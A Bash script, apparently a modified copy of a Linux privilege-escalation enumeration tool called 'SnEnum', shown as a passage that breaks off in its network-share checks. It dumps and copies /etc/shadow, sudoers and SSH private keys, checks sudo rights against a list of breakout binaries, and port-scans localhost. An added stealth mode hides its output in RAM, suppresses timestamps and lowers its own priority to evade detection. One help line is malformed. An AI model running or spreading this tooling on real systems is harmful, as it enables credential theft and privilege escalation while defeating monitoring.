#!/bin/bash
#SnEnum - System Enumeration Tool
#A script to enumerate local information from a Linux host
version="version 1.0.0"

#help function
usage () 
{ 
echo -e "\n\e[00;31m#########################################################\e[00m" 
echo -e "\e[00;31m#\e[00m" "\e[00;33mSnEnum - System Enumeration Tool\e[00m" "\e[00;31m#\e[00m"
echo -e "\e[00;31m#\e[00m" "\e[00;36mCreated by SNB\e[00m" "\e[00;31m                            #\e[00m"
echo -e "\e[00;31m#########################################################\e[00m"
echo -e "\e[00;33m# $version\e[00m\n"
echo -e "\e[00;33m# Example: ./snenum.sh -k keyword -r report -e /tmp/ -t \e[00m\n"

echo "OPTIONS:"
echo "-k	Enter keyword"
echo "-e	Enter export location"
echo "-s 	Supply user password for sudo checks (INSECURE)"
echo "-t	Include thorough (lengthy) tests"
echo "-r	Enter report name" 
echo "-H	Generate HTML report"
echo "-S	Stealth mode (minimal disk writes, avoid monitoring triggers)"
echo "-p	Show progress bar"
echo "-q	Quiet mode (only show high-value findings)"
echo "-h	Displays this help text"
echo -e "\n"
echo "Running with no options = limited scans/no output file"echo -e "\e[00;31m#########################################################\e[00m"		
}
header()
{
if [ ! "$quiet" = "1" ]; then
  echo -e "\n\e[00;31m#########################################################\e[00m" 
  echo -e "\e[00;31m#\e[00m" "\e[00;33mSnEnum - System Enumeration Tool\e[00m" "\e[00;31m#\e[00m" 
  echo -e "\e[00;31m#\e[00m" "\e[00;36mCreated by SNB\e[00m" "\e[00;31m                            #\e[00m" 
  echo -e "\e[00;31m#########################################################\e[00m" 
  echo -e "\e[00;33m# $version\e[00m\n"
fi
}

debug_info()
{
if [ ! "$quiet" = "1" ]; then
  echo "[-] Debug Info" 

  if [ "$keyword" ]; then 
    echo "[+] Searching for the keyword $keyword in conf, php, ini and log files" 
  fi

  if [ "$report" ]; then 
	echo "[+] Report name = $report" 
  fi

  if [ "$export" ]; then 
	echo "[+] Export location = $export" 
  fi

  if [ "$thorough" ]; then 
	echo "[+] Thorough tests = Enabled" 
  else 
	echo -e "\e[00;33m[+] Thorough tests = Disabled\e[00m" 
  fi

  if [ "$stealth" ]; then 
	echo -e "\e[00;35m[+] Stealth mode = ENABLED (minimal footprint)\e[00m" 
  fi

  if [ "$quiet" ]; then 
	echo -e "\e[00;36m[+] Quiet mode = ENABLED (high-value findings only)\e[00m" 
  fi

  sleep 2
fi

if [ "$export" ]; then
  if [ ! "$stealth" ]; then
    mkdir $export 2>/dev/null
    format=$export/SnEnum-export-`date +"%d-%m-%y"`
    mkdir $format 2>/dev/null
  else
    # Stealth mode: use /dev/shm (RAM-based, no disk writes)
    format="/dev/shm/.snenum-$$"
    mkdir -p $format 2>/dev/null
    echo -e "\e[00;35m[STEALTH] Using RAM-based storage: $format\e[00m"
  fi
fi

if [ "$sudopass" ]; then 
  echo -e "\e[00;35m[+] Please enter password - INSECURE - really only for CTF use!\e[00m"
  read -s userpassword
  echo 
fi

who=`whoami` 2>/dev/null 

if [ ! "$quiet" = "1" ]; then
  echo -e "\n" 

  if [ ! "$stealth" ]; then
    echo -e "\e[00;33mScan started at:"; date 
    echo -e "\e[00m\n"
  else
    echo -e "\e[00;35m[STEALTH] Scan initiated (timestamp suppressed)\e[00m"
    echo -e "\e[00m\n"
  fi
fi
}

# useful binaries (thanks to https://gtfobins.github.io/)
binarylist='aria2c\|arp\|ash\|awk\|base64\|bash\|busybox\|cat\|chmod\|chown\|cp\|csh\|curl\|cut\|dash\|date\|dd\|diff\|dmsetup\|docker\|ed\|emacs\|env\|expand\|expect\|file\|find\|flock\|fmt\|fold\|ftp\|gawk\|gdb\|gimp\|git\|grep\|head\|ht\|iftop\|ionice\|ip$\|irb\|jjs\|jq\|jrunscript\|ksh\|ld.so\|ldconfig\|less\|logsave\|lua\|make\|man\|mawk\|more\|mv\|mysql\|nano\|nawk\|nc\|netcat\|nice\|nl\|nmap\|node\|od\|openssl\|perl\|pg\|php\|pic\|pico\|python\|readelf\|rlwrap\|rpm\|rpmquery\|rsync\|ruby\|run-parts\|rvim\|scp\|script\|sed\|setarch\|sftp\|sh\|shuf\|socat\|sort\|sqlite3\|ssh$\|start-stop-daemon\|stdbuf\|strace\|systemctl\|tail\|tar\|taskset\|tclsh\|tee\|telnet\|tftp\|time\|timeout\|ul\|unexpand\|uniq\|unshare\|vi\|vim\|watch\|wget\|wish\|xargs\|xxd\|zip\|zsh'

# Stealth helper functions
stealth_find() {
  # Use 'find' with niceness and I/O priority to reduce detection
  if [ "$stealth" ]; then
    nice -n 19 ionice -c3 find "$@" 2>/dev/null
  else
    find "$@" 2>/dev/null
  fi
}

stealth_grep() {
  # Use grep with reduced priority
  if [ "$stealth" ]; then
    nice -n 19 grep "$@" 2>/dev/null
  else
    grep "$@" 2>/dev/null
  fi
}

# Progress bar functions
TOTAL_STEPS=14
CURRENT_STEP=0

show_progress() {
  if [ "$progress" != "1" ]; then
    return
  fi
  
  CURRENT_STEP=$((CURRENT_STEP + 1))
  local percent=$((CURRENT_STEP * 100 / TOTAL_STEPS))
  local completed=$((CURRENT_STEP * 50 / TOTAL_STEPS))
  local remaining=$((50 - completed))
  local step_name="$1"
  
  # Clear line and show progress bar
  printf "\r\e[K"
  printf "\e[00;36m[\e[00m"
  
  # Filled portion (green)
  for ((i=0; i<completed; i++)); do
    printf "\e[00;32m█\e[00m"
  done
  
  # Empty portion (gray)
  for ((i=0; i<remaining; i++)); do
    printf "\e[00;90m░\e[00m"
  done
  
  printf "\e[00;36m]\e[00m"
  printf " \e[00;33m%3d%%\e[00m" "$percent"
  printf " \e[00;36m│\e[00m \e[00;37m%-30s\e[00m" "$step_name"
  
  # Add checkmark when complete
  if [ "$CURRENT_STEP" -eq "$TOTAL_STEPS" ]; then
    printf " \e[00;32m✓\e[00m\n"
  fi
}

init_progress() {
  if [ "$progress" = "1" ]; then
    echo -e "\e[00;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
    echo -e "\e[00;36m                          SCAN PROGRESS                                   \e[00m"
    echo -e "\e[00;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
    echo ""
  fi
}

finish_progress() {
  if [ "$progress" = "1" ]; then
    echo ""
    echo -e "\e[00;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
    echo -e "\e[00;32m                    ✓ SCAN COMPLETED SUCCESSFULLY                         \e[00m"
    echo -e "\e[00;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
    echo ""
  fi
}

# Quiet mode output filters
# High-value findings only (critical security issues)
quiet_echo() {
  # Always print in quiet mode - for high-value findings
  if [ "$quiet" = "1" ]; then
    echo -e "$@"
  fi
}

info_echo() {
  # Skip informational output in quiet mode
  if [ ! "$quiet" = "1" ]; then
    echo -e "$@"
  fi
}

section_header() {
  # Only show section headers in non-quiet mode
  if [ ! "$quiet" = "1" ]; then
    echo -e "\e[00;33m$@\e[00m"
  fi
}

system_info()
{
echo -e "\e[00;33m### SYSTEM ##############################################\e[00m" 

#basic kernel info
unameinfo=`uname -a 2>/dev/null`
if [ "$unameinfo" ]; then
  echo -e "\e[00;31m[-] Kernel information:\e[00m\n$unameinfo" 
  echo -e "\n" 
fi

procver=`cat /proc/version 2>/dev/null`
if [ "$procver" ]; then
  echo -e "\e[00;31m[-] Kernel information (continued):\e[00m\n$procver" 
  echo -e "\n" 
fi

#search all *-release files for version info
release=`cat /etc/*-release 2>/dev/null`
if [ "$release" ]; then
  echo -e "\e[00;31m[-] Specific release information:\e[00m\n$release" 
  echo -e "\n" 
fi

#target hostname info
hostnamed=`hostname 2>/dev/null`
if [ "$hostnamed" ]; then
  echo -e "\e[00;31m[-] Hostname:\e[00m\n$hostnamed" 
  echo -e "\n" 
fi
}

user_info()
{
echo -e "\e[00;33m### USER/GROUP ##########################################\e[00m" 

#current user details
currusr=`id 2>/dev/null`
if [ "$currusr" ]; then
  echo -e "\e[00;31m[-] Current user/group info:\e[00m\n$currusr" 
  echo -e "\n"
fi

#last logged on user information
lastlogedonusrs=`lastlog 2>/dev/null |grep -v "Never" 2>/dev/null`
if [ "$lastlogedonusrs" ]; then
  echo -e "\e[00;31m[-] Users that have previously logged onto the system:\e[00m\n$lastlogedonusrs" 
  echo -e "\n" 
fi

#who else is logged on
loggedonusrs=`w 2>/dev/null`
if [ "$loggedonusrs" ]; then
  echo -e "\e[00;31m[-] Who else is logged on:\e[00m\n$loggedonusrs" 
  echo -e "\n"
fi

#lists all id's and respective group(s)
grpinfo=`for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null`
if [ "$grpinfo" ]; then
  echo -e "\e[00;31m[-] Group memberships:\e[00m\n$grpinfo"
  echo -e "\n"
fi

#added by phackt - look for adm group (thanks patrick)
adm_users=$(echo -e "$grpinfo" | grep "(adm)")
if [[ ! -z $adm_users ]];
  then
    echo -e "\e[00;31m[-] It looks like we have some admin users:\e[00m\n$adm_users"
    echo -e "\n"
fi

#checks to see if any hashes are stored in /etc/passwd (depreciated  *nix storage method)
hashesinpasswd=`grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null`
if [ "$hashesinpasswd" ]; then
  echo -e "\e[00;33m[+] It looks like we have password hashes in /etc/passwd!\e[00m\n$hashesinpasswd" 
  echo -e "\n"
fi

#contents of /etc/passwd
readpasswd=`cat /etc/passwd 2>/dev/null`
if [ "$readpasswd" ]; then
  echo -e "\e[00;31m[-] Contents of /etc/passwd:\e[00m\n$readpasswd" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readpasswd" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/passwd $format/etc-export/passwd 2>/dev/null
fi

#checks to see if the shadow file can be read
readshadow=`cat /etc/shadow 2>/dev/null`
if [ "$readshadow" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: We can read the shadow file!\e[00m\n$readshadow" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readshadow" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/shadow $format/etc-export/shadow 2>/dev/null
fi

#checks to see if /etc/master.passwd can be read - BSD 'shadow' variant
readmasterpasswd=`cat /etc/master.passwd 2>/dev/null`
if [ "$readmasterpasswd" ]; then
  echo -e "\e[00;33m[+] We can read the master.passwd file!\e[00m\n$readmasterpasswd" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readmasterpasswd" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/master.passwd $format/etc-export/master.passwd 2>/dev/null
fi

#all root accounts (uid 0)
superman=`grep -v -E "^#" /etc/passwd 2>/dev/null| awk -F: '$3 == 0 { print $1}' 2>/dev/null`
if [ "$superman" ]; then
  echo -e "\e[00;31m[-] Super user account(s):\e[00m\n$superman"
  echo -e "\n"
fi

#pull out vital sudoers info
sudoers=`grep -v -e '^$' /etc/sudoers 2>/dev/null |grep -v "#" 2>/dev/null`
if [ "$sudoers" ]; then
  echo -e "\e[00;31m[-] Sudoers configuration (condensed):\e[00m$sudoers"
  echo -e "\n"
fi

if [ "$export" ] && [ "$sudoers" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/sudoers $format/etc-export/sudoers 2>/dev/null
fi

#can we sudo without supplying a password
sudoperms=`echo '' | sudo -S -l -k 2>/dev/null`
if [ "$sudoperms" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: We can sudo without supplying a password!\e[00m\n$sudoperms" 
  echo -e "\n"
fi

#check sudo perms - authenticated
if [ "$sudopass" ]; then
    if [ "$sudoperms" ]; then
      :
    else
      sudoauth=`echo $userpassword | sudo -S -l -k 2>/dev/null`
      if [ "$sudoauth" ]; then
        echo -e "\e[00;33m[+] We can sudo when supplying a password!\e[00m\n$sudoauth" 
        echo -e "\n"
      fi
    fi
fi

##known 'good' breakout binaries (cleaned to parse /etc/sudoers for comma separated values) - authenticated
if [ "$sudopass" ]; then
    if [ "$sudoperms" ]; then
      :
    else
      sudopermscheck=`echo $userpassword | sudo -S -l -k 2>/dev/null | xargs -n 1 2>/dev/null|sed 's/,*$//g' 2>/dev/null | grep -w $binarylist 2>/dev/null`
      if [ "$sudopermscheck" ]; then
        echo -e "\e[00;33m[-] Possible sudo pwnage!\e[00m\n$sudopermscheck" 
        echo -e "\n"
      fi
    fi
fi

#known 'good' breakout binaries (cleaned to parse /etc/sudoers for comma separated values)
sudopwnage=`echo '' | sudo -S -l -k 2>/dev/null | xargs -n 1 2>/dev/null | sed 's/,*$//g' 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$sudopwnage" ]; then
  echo -e "\e[00;33m[+] Possible sudo pwnage!\e[00m\n$sudopwnage" 
  echo -e "\n"
fi

#who has sudoed in the past
whohasbeensudo=`find /home -name .sudo_as_admin_successful 2>/dev/null`
if [ "$whohasbeensudo" ]; then
  echo -e "\e[00;31m[-] Accounts that have recently used sudo:\e[00m\n$whohasbeensudo" 
  echo -e "\n"
fi

#checks to see if roots home directory is accessible
rthmdir=`ls -ahl /root/ 2>/dev/null`
if [ "$rthmdir" ]; then
  echo -e "\e[00;33m[+] We can read root's home directory!\e[00m\n$rthmdir" 
  echo -e "\n"
fi

#displays /home directory permissions - check if any are lax
homedirperms=`ls -ahl /home/ 2>/dev/null`
if [ "$homedirperms" ]; then
  echo -e "\e[00;31m[-] Are permissions on /home directories lax:\e[00m\n$homedirperms" 
  echo -e "\n"
fi

#looks for files we can write to that don't belong to us
if [ "$thorough" = "1" ]; then
  grfilesall=`find / -writable ! -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
  if [ "$grfilesall" ]; then
    echo -e "\e[00;31m[-] Files not owned by user but writable by group:\e[00m\n$grfilesall" 
    echo -e "\n"
  fi
fi

#looks for files that belong to us
if [ "$thorough" = "1" ]; then
  ourfilesall=`find / -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
  if [ "$ourfilesall" ]; then
    echo -e "\e[00;31m[-] Files owned by our user:\e[00m\n$ourfilesall"
    echo -e "\n"
  fi
fi

#looks for hidden files
if [ "$thorough" = "1" ]; then
  hiddenfiles=`find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
  if [ "$hiddenfiles" ]; then
    echo -e "\e[00;31m[-] Hidden files:\e[00m\n$hiddenfiles"
    echo -e "\n"
  fi
fi

#looks for world-reabable files within /home - depending on number of /home dirs & files, this can take some time so is only 'activated' with thorough scanning switch
if [ "$thorough" = "1" ]; then
wrfileshm=`find /home/ -perm -4 -type f -exec ls -al {} \; 2>/dev/null`
	if [ "$wrfileshm" ]; then
		echo -e "\e[00;31m[-] World-readable files within /home:\e[00m\n$wrfileshm" 
		echo -e "\n"
	fi
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$wrfileshm" ]; then
		mkdir $format/wr-files/ 2>/dev/null
		for i in $wrfileshm; do cp --parents $i $format/wr-files/ ; done 2>/dev/null
	fi
fi

#lists current user's home directory contents
if [ "$thorough" = "1" ]; then
homedircontents=`ls -ahl ~ 2>/dev/null`
	if [ "$homedircontents" ] ; then
		echo -e "\e[00;31m[-] Home directory contents:\e[00m\n$homedircontents" 
		echo -e "\n" 
	fi
fi

#checks for if various ssh files are accessible - this can take some time so is only 'activated' with thorough scanning switch
if [ "$thorough" = "1" ]; then
sshfiles=`find / \( -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" \) -exec ls -la {} 2>/dev/null \;`
	if [ "$sshfiles" ]; then
		echo -e "\e[00;31m[-] SSH keys/host information found in the following locations:\e[00m\n$sshfiles" 
		echo -e "\n"
	fi
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$sshfiles" ]; then
		mkdir $format/ssh-files/ 2>/dev/null
		for i in $sshfiles; do cp --parents $i $format/ssh-files/; done 2>/dev/null
	fi
fi

#is root permitted to login via ssh
sshrootlogin=`grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#" | awk '{print  $2}'`
if [ "$sshrootlogin" = "yes" ]; then
  echo -e "\e[00;31m[-] Root is allowed to login via SSH:\e[00m" ; grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#" 
  echo -e "\n"
fi
}

environmental_info()
{
echo -e "\e[00;33m### ENVIRONMENTAL #######################################\e[00m" 

#env information
envinfo=`env 2>/dev/null | grep -v 'LS_COLORS' 2>/dev/null`
if [ "$envinfo" ]; then
  echo -e "\e[00;31m[-] Environment information:\e[00m\n$envinfo" 
  echo -e "\n"
fi

#check if selinux is enabled
sestatus=`sestatus 2>/dev/null`
if [ "$sestatus" ]; then
  echo -e "\e[00;31m[-] SELinux seems to be present:\e[00m\n$sestatus"
  echo -e "\n"
fi

#phackt

#current path configuration
pathinfo=`echo $PATH 2>/dev/null`
if [ "$pathinfo" ]; then
  pathswriteable=`ls -ld $(echo $PATH | tr ":" " ")`
  echo -e "\e[00;31m[-] Path information:\e[00m\n$pathinfo" 
  echo -e "$pathswriteable"
  echo -e "\n"
fi

#lists available shells
shellinfo=`cat /etc/shells 2>/dev/null`
if [ "$shellinfo" ]; then
  echo -e "\e[00;31m[-] Available shells:\e[00m\n$shellinfo" 
  echo -e "\n"
fi

#current umask value with both octal and symbolic output
umaskvalue=`umask -S 2>/dev/null & umask 2>/dev/null`
if [ "$umaskvalue" ]; then
  echo -e "\e[00;31m[-] Current umask value:\e[00m\n$umaskvalue" 
  echo -e "\n"
fi

#umask value as in /etc/login.defs
umaskdef=`grep -i "^UMASK" /etc/login.defs 2>/dev/null`
if [ "$umaskdef" ]; then
  echo -e "\e[00;31m[-] umask value as specified in /etc/login.defs:\e[00m\n$umaskdef" 
  echo -e "\n"
fi

#password policy information as stored in /etc/login.defs
logindefs=`grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 2>/dev/null`
if [ "$logindefs" ]; then
  echo -e "\e[00;31m[-] Password and storage information:\e[00m\n$logindefs" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$logindefs" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/login.defs $format/etc-export/login.defs 2>/dev/null
fi
}

job_info()
{
echo -e "\e[00;33m### JOBS/TASKS ##########################################\e[00m" 

#are there any cron jobs configured
cronjobs=`ls -la /etc/cron* 2>/dev/null`
if [ "$cronjobs" ]; then
  echo -e "\e[00;31m[-] Cron jobs:\e[00m\n$cronjobs" 
  echo -e "\n"
fi

#can we manipulate these jobs in any way
cronjobwwperms=`find /etc/cron* -perm -0002 -type f -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
if [ "$cronjobwwperms" ]; then
  echo -e "\e[00;33m[+] World-writable cron jobs and file contents:\e[00m\n$cronjobwwperms" 
  echo -e "\n"
fi

#contab contents
crontabvalue=`cat /etc/crontab 2>/dev/null`
if [ "$crontabvalue" ]; then
  echo -e "\e[00;31m[-] Crontab contents:\e[00m\n$crontabvalue" 
  echo -e "\n"
fi

crontabvar=`ls -la /var/spool/cron/crontabs 2>/dev/null`
if [ "$crontabvar" ]; then
  echo -e "\e[00;31m[-] Anything interesting in /var/spool/cron/crontabs:\e[00m\n$crontabvar" 
  echo -e "\n"
fi

anacronjobs=`ls -la /etc/anacrontab 2>/dev/null; cat /etc/anacrontab 2>/dev/null`
if [ "$anacronjobs" ]; then
  echo -e "\e[00;31m[-] Anacron jobs and associated file permissions:\e[00m\n$anacronjobs" 
  echo -e "\n"
fi

anacrontab=`ls -la /var/spool/anacron 2>/dev/null`
if [ "$anacrontab" ]; then
  echo -e "\e[00;31m[-] When were jobs last executed (/var/spool/anacron contents):\e[00m\n$anacrontab" 
  echo -e "\n"
fi

#pull out account names from /etc/passwd and see if any users have associated cronjobs (priv command)
cronother=`cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null`
if [ "$cronother" ]; then
  echo -e "\e[00;31m[-] Jobs held by all users:\e[00m\n$cronother" 
  echo -e "\n"
fi

# list systemd timers
if [ "$thorough" = "1" ]; then
  # include inactive timers in thorough mode
  systemdtimers="$(systemctl list-timers --all 2>/dev/null)"
  info=""
else
  systemdtimers="$(systemctl list-timers 2>/dev/null |head -n -1 2>/dev/null)"
  # replace the info in the output with a hint towards thorough mode
  info="\e[2mEnable thorough tests to see inactive timers\e[00m"
fi
if [ "$systemdtimers" ]; then
  echo -e "\e[00;31m[-] Systemd timers:\e[00m\n$systemdtimers\n$info"
  echo -e "\n"
fi

}

networking_info()
{
echo -e "\e[00;33m### NETWORKING  ##########################################\e[00m" 

#nic information
nicinfo=`/sbin/ifconfig -a 2>/dev/null`
if [ "$nicinfo" ]; then
  echo -e "\e[00;31m[-] Network and IP info:\e[00m\n$nicinfo" 
  echo -e "\n"
fi

#nic information (using ip)
nicinfoip=`/sbin/ip a 2>/dev/null`
if [ ! "$nicinfo" ] && [ "$nicinfoip" ]; then
  echo -e "\e[00;31m[-] Network and IP info:\e[00m\n$nicinfoip" 
  echo -e "\n"
fi

arpinfo=`arp -a 2>/dev/null`
if [ "$arpinfo" ]; then
  echo -e "\e[00;31m[-] ARP history:\e[00m\n$arpinfo" 
  echo -e "\n"
fi

arpinfoip=`ip n 2>/dev/null`
if [ ! "$arpinfo" ] && [ "$arpinfoip" ]; then
  echo -e "\e[00;31m[-] ARP history:\e[00m\n$arpinfoip" 
  echo -e "\n"
fi

#dns settings
nsinfo=`grep "nameserver" /etc/resolv.conf 2>/dev/null`
if [ "$nsinfo" ]; then
  echo -e "\e[00;31m[-] Nameserver(s):\e[00m\n$nsinfo" 
  echo -e "\n"
fi

nsinfosysd=`systemd-resolve --status 2>/dev/null`
if [ "$nsinfosysd" ]; then
  echo -e "\e[00;31m[-] Nameserver(s):\e[00m\n$nsinfosysd" 
  echo -e "\n"
fi

#default route configuration
defroute=`route 2>/dev/null | grep default`
if [ "$defroute" ]; then
  echo -e "\e[00;31m[-] Default route:\e[00m\n$defroute" 
  echo -e "\n"
fi

#default route configuration
defrouteip=`ip r 2>/dev/null | grep default`
if [ ! "$defroute" ] && [ "$defrouteip" ]; then
  echo -e "\e[00;31m[-] Default route:\e[00m\n$defrouteip" 
  echo -e "\n"
fi

#listening TCP
tcpservs=`netstat -ntpl 2>/dev/null`
if [ "$tcpservs" ]; then
  echo -e "\e[00;31m[-] Listening TCP:\e[00m\n$tcpservs" 
  echo -e "\n"
fi

tcpservsip=`ss -t -l -n 2>/dev/null`
if [ ! "$tcpservs" ] && [ "$tcpservsip" ]; then
  echo -e "\e[00;31m[-] Listening TCP:\e[00m\n$tcpservsip" 
  echo -e "\n"
fi

#listening UDP
udpservs=`netstat -nupl 2>/dev/null`
if [ "$udpservs" ]; then
  echo -e "\e[00;31m[-] Listening UDP:\e[00m\n$udpservs" 
  echo -e "\n"
fi

udpservsip=`ss -u -l -n 2>/dev/null`
if [ ! "$udpservs" ] && [ "$udpservsip" ]; then
  echo -e "\e[00;31m[-] Listening UDP:\e[00m\n$udpservsip" 
  echo -e "\n"
fi

# Internal Port Scanner - Quick scan of common ports on localhost
echo -e "\e[00;31m[-] Scanning common ports on localhost...\e[00m"
commonports="21 22 23 25 53 80 110 111 135 139 143 443 445 993 995 1433 1521 2049 3306 3389 5432 5900 6379 8080 8443 9200 27017"
openports=""
for port in $commonports; do
  if timeout 1 bash -c "echo >/dev/tcp/127.0.0.1/$port" 2>/dev/null; then
    openports="$openports $port"
    # Try to identify service
    service="unknown"
    case $port in
      21) service="FTP" ;;
      22) service="SSH" ;;
      23) service="Telnet" ;;
      25) service="SMTP" ;;
      53) service="DNS" ;;
      80) service="HTTP" ;;
      110) service="POP3" ;;
      111) service="RPC" ;;
      135) service="MSRPC" ;;
      139) service="NetBIOS" ;;
      143) service="IMAP" ;;
      443) service="HTTPS" ;;
      445) service="SMB" ;;
      993) service="IMAPS" ;;
      995) service="POP3S" ;;
      1433) service="MSSQL" ;;
      1521) service="Oracle" ;;
      2049) service="NFS" ;;
      3306) service="MySQL" ;;
      3389) service="RDP" ;;
      5432) service="PostgreSQL" ;;
      5900) service="VNC" ;;
      6379) service="Redis" ;;
      8080) service="HTTP-Alt" ;;
      8443) service="HTTPS-Alt" ;;
      9200) service="Elasticsearch" ;;
      27017) service="MongoDB" ;;
    esac
    echo -e "  \e[00;33m→\e[00m Port $port ($service) - OPEN"
  fi
done

if [ -n "$openports" ]; then
  echo -e "\e[00;33m[+] Open localhost ports:$openports\e[00m"
  echo -e "\n"
else
  echo -e "\e[00;32m[-] No common ports found open on localhost\e[00m"
  echo -e "\n"
fi

# Active Connections Analysis - Show established connections with process names
echo -e "\e[00;31m[-] Analyzing active network connections...\e[00m"
activeconns=`netstat -tnp 2>/dev/null | grep ESTABLISHED`
if [ "$activeconns" ]; then
  echo -e "\e[00;33m[+] Established TCP connections with processes:\e[00m"
  echo -e "$activeconns"
  echo -e "\n"
  
  # Extract unique remote IPs
  remoteips=`echo "$activeconns" | awk '{print $5}' | cut -d: -f1 | sort -u`
  if [ "$remoteips" ]; then
    echo -e "\e[00;33m[+] Unique remote IPs in active connections:\e[00m"
    echo -e "$remoteips"
    echo -e "\n"
  fi
fi

# Alternative with ss command
activeconnsss=`ss -tnp 2>/dev/null | grep ESTAB`
if [ ! "$activeconns" ] && [ "$activeconnsss" ]; then
  echo -e "\e[00;33m[+] Established TCP connections with processes:\e[00m"
  echo -e "$activeconnsss"
  echo -e "\n"
fi

# Show connection statistics
connstats=`ss -s 2>/dev/null`
if [ "$connstats" ]; then
  echo -e "\e[00;31m[-] Connection statistics:\e[00m"
  echo -e "$connstats"
  echo -e "\n"
fi

# Firewall Rules Display - Show iptables/nftables/ufw rules
echo -e "\e[00;31m[-] Checking firewall configuration...\e[00m"

# iptables rules
iptablesrules=`iptables -L -n -v 2>/dev/null`
if [ "$iptablesrules" ]; then
  echo -e "\e[00;33m[+] iptables rules:\e[00m"
  echo -e "$iptablesrules"
  echo -e "\n"
  
  # Check NAT table
  iptablesnat=`iptables -t nat -L -n -v 2>/dev/null`
  if [ "$iptablesnat" ]; then
    echo -e "\e[00;33m[+] iptables NAT table:\e[00m"
    echo -e "$iptablesnat"
    echo -e "\n"
  fi
  
  # Check for permissive rules
  if echo "$iptablesrules" | grep -qE "policy ACCEPT|0\.0\.0\.0/0.*ACCEPT"; then
    echo -e "\e[00;33m[!] Permissive firewall rules detected (ACCEPT policies)\e[00m"
    echo -e "\n"
  fi
fi

# ip6tables rules
ip6tablesrules=`ip6tables -L -n -v 2>/dev/null`
if [ "$ip6tablesrules" ]; then
  echo -e "\e[00;33m[+] ip6tables rules:\e[00m"
  echo -e "$ip6tablesrules"
  echo -e "\n"
fi

# nftables rules
nftablesrules=`nft list ruleset 2>/dev/null`
if [ "$nftablesrules" ]; then
  echo -e "\e[00;33m[+] nftables ruleset:\e[00m"
  echo -e "$nftablesrules"
  echo -e "\n"
fi

# UFW status
ufwstatus=`ufw status verbose 2>/dev/null`
if [ "$ufwstatus" ]; then
  echo -e "\e[00;33m[+] UFW firewall status:\e[00m"
  echo -e "$ufwstatus"
  echo -e "\n"
  
  # Check if UFW is inactive
  if echo "$ufwstatus" | grep -q "Status: inactive"; then
    HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
    echo -e "\e[00;33m[+] HIGH-VALUE: UFW firewall is INACTIVE!\e[00m"
    echo -e "\n"
  fi
fi

# firewalld status
firewalldstatus=`firewall-cmd --state 2>/dev/null`
if [ "$firewalldstatus" = "running" ]; then
  echo -e "\e[00;33m[+] firewalld is running\e[00m"
  firewalldzone=`firewall-cmd --get-active-zones 2>/dev/null`
  echo -e "\e[00;31m[-] Active zones:\e[00m\n$firewalldzone"
  firewalldlist=`firewall-cmd --list-all 2>/dev/null`
  echo -e "\e[00;31m[-] Firewall rules:\e[00m\n$firewalldlist"
  echo -e "\n"
fi

# Check if no firewall is active
if [ -z "$iptablesrules" ] && [ -z "$nftablesrules" ] && [ -z "$ufwstatus" ] && [ "$firewalldstatus" != "running" ]; then
  HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
  echo -e "\e[00;33m[+] HIGH-VALUE: No active firewall detected!\e[00m"
  echo -e "\n"
fi

# Network Share Enumeration - Better NFS/SMB/CIFS share discovery
echo -e "\e[00;31m[-] Enumerating network shares...\e[00m"

# NFS exports
nfsexports=`cat /etc/exports 2>/dev/null`
if [ "$nfsexports" ]; then
  echo -e "\e[00;33m[+] NFS exports configured:\e[00m"
  echo -e "$nfsexports"
  echo -e "\n"
  
  # Check for insecure NFS exports
  if echo "$nfsexports" | grep -qE "no_root_squash|insecure|rw"; then
    HIGH_VALUE_COUNT=$((HIGH_VALUE_COUNT + 1))
    echo -e "\e[00;33m[+] HIGH-VALUE: Insecure NFS export options detected!\e[00m"
    echo -e "\e[00;36m[!] Check for: no_root_squash, insecure, rw permissions\e[00m"
    echo -e "\n"
  fi
fi

# Currently mounted NFS shares
nfsmounts=`mount | grep nfs 2>/dev/null`
if [ "$nfsmounts" ]; then
